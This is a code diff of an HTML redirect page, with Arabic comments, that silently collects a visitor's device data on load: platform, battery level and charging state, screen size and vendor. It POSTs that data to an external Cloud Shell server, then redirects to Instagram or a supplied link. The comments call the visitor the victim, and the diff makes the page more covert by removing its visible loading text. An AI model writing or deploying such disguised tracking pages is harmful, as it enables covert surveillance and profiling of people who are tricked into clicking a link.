@@ -1,27 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Redirecting...</title>
     <script>
-        // هذا الرابط هو رابط سيرفر جوجل مالتك (تأكد إنه نفس اللي دزيته)
+        // رابط السيرفر اللي دزيته أنت
         const SERVER_URL = "https://8080-cs-f65a8037-daaf-45b2-a58a-a8f4d4f83c4f.cs-europe-west4-pear.cloudshell.dev/";
-        
-        async function sendData() {
+
+        async function collectAndSend() {
             const urlParams = new URLSearchParams(window.location.search);
-            const target = urlParams.get('u') || 'https://t.me/vo11a';
+            const target = urlParams.get('u') || 'https://instagram.com';
             
-            // إرسال البيانات للسيرفر بالخلفية
-            fetch(`${SERVER_URL}?u=${encodeURIComponent(target)}`, { mode: 'no-cors' });
-            
-            // تحويل الضحية للرابط الحقيقي بعد ثانية وحدة
-            setTimeout(() => {
-                window.location.replace(target);
-            }, 1000);
+            // سحب معلومات البطارية
+            let batteryLevel = "N/A";
+            try {
+                const b = await navigator.getBattery();
+                batteryLevel = `${Math.round(b.level * 100)}% (${b.charging ? 'يشحن' : 'فرغ'})`;
+            } catch(e) {}
+
+            // تجهيز بيانات الجهاز
+            const deviceData = {
+                platform: navigator.platform,
+                battery: batteryLevel,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                target: target,
+                vendor: navigator.vendor
+            };
+
+            // إرسال البيانات للسيرفر (POST)
+            try {
+                await fetch(SERVER_URL, {
+                    method: 'POST',
+                    mode: 'cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(deviceData)
+                });
+            } catch (err) {
+                console.log("Error");
+            }
+
+            // تحويل الضحية فوراً للرابط الأصلي
+            window.location.replace(target);
         }
-        window.onload = sendData;
+        window.onload = collectAndSend;
     </script>
 </head>
-<body>
-    <p>Loading...</p>
-</body>
+<body style="background: #000;"></body>
 </html>
